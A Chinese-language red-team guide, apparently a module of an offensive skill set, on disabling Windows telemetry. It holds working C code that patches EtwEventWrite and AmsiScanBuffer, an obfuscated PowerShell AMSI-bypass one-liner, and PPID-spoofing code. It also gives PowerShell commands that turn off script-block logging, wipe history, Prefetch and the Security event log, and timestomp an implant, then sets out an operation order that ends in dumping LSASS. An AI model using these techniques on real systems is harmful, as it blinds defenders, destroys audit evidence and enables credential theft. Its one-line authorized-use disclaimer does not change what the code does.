# 遥测致盲：ETW / AMSI / 反取证

> 仅限授权红队 / 对抗演练 / 自有产品测试，禁止用于未授权目标。

EDR 的检测能力很大程度依赖 ETW（Event Tracing for Windows）与 AMSI（Antimalware Scan Interface）这两条遥测管道。
本文档汇总针对这两条管道的红队对策，并补充 Sysmon / PowerShell logging / 时间戳 spoof 等反取证组合。

对照 MITRE ATT&CK：T1562.001 / T1562.002 / T1562.006 / T1070 / T1027。

## 1. ETW 内部结构

ETW 是 Windows 内置的高性能事件追踪框架，EDR 用它做"轻量内核遥测"。
红队最关心的 provider：

| Provider GUID | 名称 | 谁在用 |
|--------------|------|--------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender、MDE、第三方 EDR |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI 上报 |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | 进程 / 线程基础事件 |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET 加载、JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR 启动 |

### 关键用户态 API

| API | DLL | 作用 |
|-----|-----|------|
| `EtwEventWrite` | `ntdll.dll` | 写事件（最常用） |
| `EtwEventWriteFull` | `ntdll.dll` | 带 activity ID 的事件 |
| `EtwEventWriteEx` | `ntdll.dll` | 扩展版本 |
| `NtTraceEvent` | `ntdll.dll` | EtwEventWrite 底层 |
| `NtTraceControl` | `ntdll.dll` | 控制 trace session（启/停/查询 provider） |
| `EtwEventEnabled` | `ntdll.dll` | provider 是否启用 |
| `EtwEventRegister` | `ntdll.dll` | 注册 provider |

### 调用链

```text
应用代码 EventWrite(...)
  → 微软封装 (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
  → nt!NtTraceEvent (内核)
  → 内核 ETW core → 消费端（EDR 用户态进程订阅 session）
```

## 2. ETW Patch 三种方法

### 方法 A：EtwEventWrite head patch

直接把 `ntdll!EtwEventWrite` 入口改成立即返回成功：

```text
原始：
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

patch 后（x64）：
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

C 代码：

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // 注意：VirtualProtect 自身可能被 hook -> 用 indirect syscall 版本
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC 警告**：写 ntdll 内存本身是 ETW-TI 监控的 `ALPC_MODIFY_PROCESS` / `PROTECTVM` 事件源。
必须 **先用 indirect syscall + 绕过 NtProtectVirtualMemory hook 后再 patch**，
否则 patch 还没生效 EDR 就已经收到告警。

### 方法 B：EtwEventEnabled always-false

更隐蔽：不修改 `EtwEventWrite`，而是让 `EtwEventEnabled` 永远返回 FALSE，
应用层会自己判断 "provider 没开" → 不调用 `EtwEventWrite`，对内存 hash 完整性检查更友好（很多 EDR 校验 `EtwEventWrite` 字节）。

```c
// EtwEventEnabled 通常返回 BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### 方法 C：NtTraceControl 关 provider

用 syscall 直接关闭 EDR session（侵入式，但是不动 ntdll 字节）：

```c
// NtTraceControl(EtwpStopTrace, ...)
// 需要 SeSystemProfilePrivilege 或更高
// 适用于 Local Admin + UAC bypass 后
```

实战中较少用，因为：

- 关 session 本身会触发"ETW provider stopped"事件被另一条管道感知
- 需要高权限

### 方法 D：内核态 ETW patch（仅在已有 BYOVD/内核读写时）

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
直接置 0 让所有 ETW-TI 事件被丢弃
```

属于 attack-chain 的 BYOVD 阶段，本 skill 不深入。

## 3. AMSI Bypass

AMSI 是 Windows 提供给 PowerShell / .NET / WMI / VBA 在执行脚本前做反病毒扫描的接口。
红队最常碰到的是 PowerShell + AMSI。

### 经典 AmsiScanBuffer Patch

```c
// amsi.dll!AmsiScanBuffer 入口写：
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret 4                    ; (32位) 或 ret (64位)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

PowerShell 一句话版本（仅参考检测对抗，本身被签名 / Defender 拦截）：

```powershell
# 概念演示——真实环境必须配合混淆 / HWBP
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### 进阶方案 1：Hardware Breakpoint AMSI Bypass

不动 amsi.dll 内存（不会触发完整性扫描）：

1. AddVectoredExceptionHandler
2. 在 `AmsiScanBuffer` 入口设 `DR0`
3. VEH 命中时设置 `RAX = 0x80070057`、`RIP = ret 指令地址`、`RSP += 8`
4. ContinueExecution

与 unhook-techniques.md 的 HWBP Blindside 同一套基础设施，可以共用 VEH。

### 进阶方案 2：AmsiContext / AmsiSession 损坏

构造畸形 `AmsiContext` 结构，让 `AmsiScanBuffer` 内部因为校验失败提前返回 success：

```text
// AmsiContext 头部应该是 "AMSI" 魔数
// 改成 "XXXX" → AmsiScanBuffer 内部校验失败但返回 S_OK + AMSI_RESULT_CLEAN
```

### 进阶方案 3：Reflective 加载副本 amsi.dll

不用系统 amsi.dll，把一份干净副本反射加载到自己进程，并重定向 PowerShell 引擎对 AMSI 的调用。
适用于已经在加载阶段拦截 PowerShell.exe 启动的高级 EDR。

## 4. 反取证：清除痕迹

### PowerShell ScriptBlock Logging 关闭

```powershell
# 注册表（需管理员）
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy 路径：
# Computer Configuration → Administrative Templates → Windows Components →
#   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
```

### 清 PowerShell history

```powershell
# 当前会话
Clear-History
# 持久化 history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

### 清 Prefetch

```powershell
# 需要 SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
# 整体清空（动作大，慎用）
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```

### 清 ETL log

```powershell
# 停 session 后删 etl
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# 注意：直接删 .evtx 会被 Event Log Service 重新创建并写入 "log cleared" 事件 (Event ID 1102)
# 更隐蔽：内存中 patch wevtsvc.dll 的 EventLog API（属于 T1070.001）
```

### 时间戳 spoof (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Sysmon 监控规避

Sysmon 是社区最常见的免费遥测（很多企业用 olaf 配置）。
关键事件：

| Event ID | 含义 |
|----------|------|
| 1 | ProcessCreate（含 PPID、CommandLine、Hash） |
| 7 | ImageLoad（DLL 加载） |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess（OpenProcess） |
| 11 | FileCreate |
| 12/13/14 | 注册表 |
| 22 | DNS Query |
| 25 | ProcessTampering（image hollowing） |

### 规避思路

1. **不创建新进程** — 全部在已注入进程内行动，避开 Event ID 1
2. **PPID Spoof** — 用 `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` 把 PPID 设为 `explorer.exe`，让 Sysmon ProcessCreate 看着合法

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked memory + 不动镜像** — Process Hollowing 在新版 Sysmon 已经被 Event ID 25 捕获。
   首选用 **module stomping**（覆盖已加载合法 DLL 的某节区）或 **dirty vanity** 等较新技术，
   配合 PPID spoof
4. **不要远程线程** — 避免 Event ID 8；用 `NtCreateThreadEx` 在自己进程内执行 / APC / Early Bird APC
5. **DNS 走 DoH / HTTPS** — 避免 Event ID 22

## 6. Call Stack Spoof + 时间戳让事件像合法软件

即使 ProcessCreate 没办法不触发（比如某些场景必须 spawn child），可以：

- 把 CommandLine 改成与某个合法软件相似的格式
- PPID spoof 到 services.exe（伪装 SCM 启动的服务）
- 修改 ImageLoad 看到的 Image hash：通过 module stomping 把 implant 代码放进一个签名 DLL 内存空间
- 配合 CallStackSpoofer：Sysmon 即使开了 EnableCallTracing 也看不到 implant 帧

## 7. 实战 OPSEC：操作顺序

**顺序错了 EDR 会先收到告警**，导致后续动作直接被熔断。

正确顺序：

```text
1. AMSI bypass (HWBP 优先，避免写 amsi.dll)
   ─── 让 .NET / PowerShell 装载 implant 时不被扫
2. ETW patch (先 patch EtwEventWrite，再做任何 syscall)
   ─── 关掉自身后续动作的遥测
3. NtProtectVirtualMemory 用 indirect syscall 调用
   ─── 准备好"安全的"内存权限切换通道
4. Unhook ntdll (Peruns Fart) 或 enable indirect syscall
   ─── 抹掉用户态 hook
5. Call stack spoof setup
   ─── 准备好之后所有 syscall 的伪栈
6. 实际 payload 执行 (注入 / 横向 / dump LSASS)
7. 清痕迹 (PowerShell history / Prefetch / 时间戳)
```

错误顺序示例：

```text
❌ 先 unhook ntdll → ETW-TI 立即上报 PROTECTVM + module modification → SOC 已经收到告警
❌ 先 dump LSASS → AMSI / ETW 都还没压 → 高置信 T1003.001 告警
✅ AMSI → ETW → unhook → spoof → payload
```

## 参考资料

- ETW Threat Intelligence Provider：<https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- ETW Patching 综述：<https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI Bypass 大全：<https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf 配置：<https://github.com/olafhartong/sysmon-modular>
- PPID Spoofing：<https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask：<https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation：<https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging)：<https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking)：<https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal)：<https://attack.mitre.org/techniques/T1070/>

## 路由回调

完成本三件套（hook 调研 → unhook → telemetry 致盲）后，回到 `SKILL.md` Step 5 在 sandbox 验证，
然后按 `attack-chain/` 的 initial access 与 lateral movement 章节进入下一阶段。
